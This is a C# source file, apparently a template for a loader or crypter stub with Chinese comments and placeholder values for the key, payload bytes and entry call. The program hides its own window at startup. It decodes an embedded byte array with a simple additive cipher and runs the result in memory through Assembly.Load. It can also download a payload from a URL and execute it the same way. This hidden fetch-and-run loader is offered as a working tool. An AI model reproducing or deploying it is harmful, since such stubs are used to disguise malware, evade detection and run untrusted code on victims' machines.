using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SciTools
{
    static class Program
    {
        //[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        //private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
        private static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();


        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args0)
        {
			IntPtr curId = GetForegroundWindow();
            if (curId != IntPtr.Zero) ShowWindow(curId, 0); //隐藏窗口
			
            object[] args = new object[] { args0 };

            //SciTools.FileDeCoderTool.Run(args);
            //SciTools.FileDeCoderTool.RunOuter(path, args);
			ENTRY_VALUE
        }
    }

    /// <summary>
    /// 数据解密、执行
    /// </summary>
    public class FileDeCoderTool
    {
        private static string key = "KEY_VALUE";
        private static byte[] data = new byte[] { DATA_VALUE };

        /// <summary>
        /// 从当前类对象数据启动
        /// </summary>
        /// <param name="args">参数</param>
        /// <returns></returns>
        public static object Run(object[] args = null)
        {
            Locker(ref data, key, false);
            Assembly assembly = Assembly.Load(data);
            data = null;

            return assembly.EntryPoint.Invoke(null, args);
            //return start(assembly, args);
        }

        /// <summary>
        /// 从当前类对象数据启动
        /// </summary>
        /// <param name="args">参数</param>
        /// <returns></returns>
        public static object RunOuter(string filepath = "", object[] args = null)
        {
            if (filepath.Contains("/")) data = getWebData(filepath);                    // 载入网址对应文件数据
            else data = File2Bytes(AppDomain.CurrentDomain.BaseDirectory + filepath);  // 载入数据

            Locker(ref data, key, false);
            Assembly assembly = Assembly.Load(data);
            data = null;

            return start(assembly, args);
        }

        //从给定的网址中获取数据
        private static byte[] getWebData(string url)
        {
            try
            {
                System.Net.WebClient client = new System.Net.WebClient();
                //client.Encoding = System.Text.Encoding.UTF8;
                byte[] data = client.DownloadData(url);
                return data;
            }
            catch (Exception) { return new byte[] { }; }
        }

        /// <summary>  
        /// 将文件转换为byte数组  
        /// </summary>  
        /// <param name="path">文件地址</param>  
        /// <returns>转换后的byte数组</returns>  
        private static byte[] File2Bytes(string path)
        {
            if (!File.Exists(path))
            {
                return new byte[0];
            }

            FileInfo fi = new FileInfo(path);
            byte[] buff = new byte[fi.Length];

            FileStream fs = fi.OpenRead();
            fs.Read(buff, 0, Convert.ToInt32(fs.Length));
            fs.Close();

            return buff;
        }

        /// <summary>
        /// 使用key对bytes数据进行加密或解密
        /// </summary>
        /// <param name="bytes">待加密的数据</param>
        /// <param name="key">加密key</param>
        /// <param name="islock">是否加密</param>
        private static void Locker(ref byte[] bytes, string key = null, bool islock = true)
        {
            if (key == null || key.Equals("")) key = "d41d8cd98f00b204e9800998ecf8427e";
            byte[] keys = Encoding.UTF8.GetBytes(key);

            for (int i = 0; i < bytes.Length; i++)
            {
                byte x = (byte)(bytes[i] + keys[i % keys.Length] * (islock ? 1 : -1));
                bytes[i] = x;
            }
        }


        /// <summary>
        ///  从Assebly启动
        /// </summary>
        /// <param name="assembly">Assembly</param>
        /// <param name="args">参数</param>
        /// <returns></returns>
        private static object start(Assembly assembly = null, object[] args = null)
        {
            //string NameSpace = GetNamespace(assembly);
            //string classFullName = NameSpace + ".Program";
            //string methodName = "Main";

            MethodInfo entryPoint = assembly.EntryPoint;				// 获取入口
            string classFullName = entryPoint.DeclaringType.FullName;	// 入口所在类
            string methodName = entryPoint.Name;						// 入口方法名

            Type type = assembly.GetType(classFullName, true, true);	// 获取入口类 或 entryPoint.DeclaringType

            // 调用程序集的静态方法： Type.InvokeMember
            //object tmp = type.InvokeMember(methodName, BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, null, args);
            return type.InvokeMember(methodName, BindingFlags.InvokeMethod | (entryPoint.IsPublic ? BindingFlags.NonPublic : BindingFlags.NonPublic) | BindingFlags.Static, null, null, args);
        }

    }

}
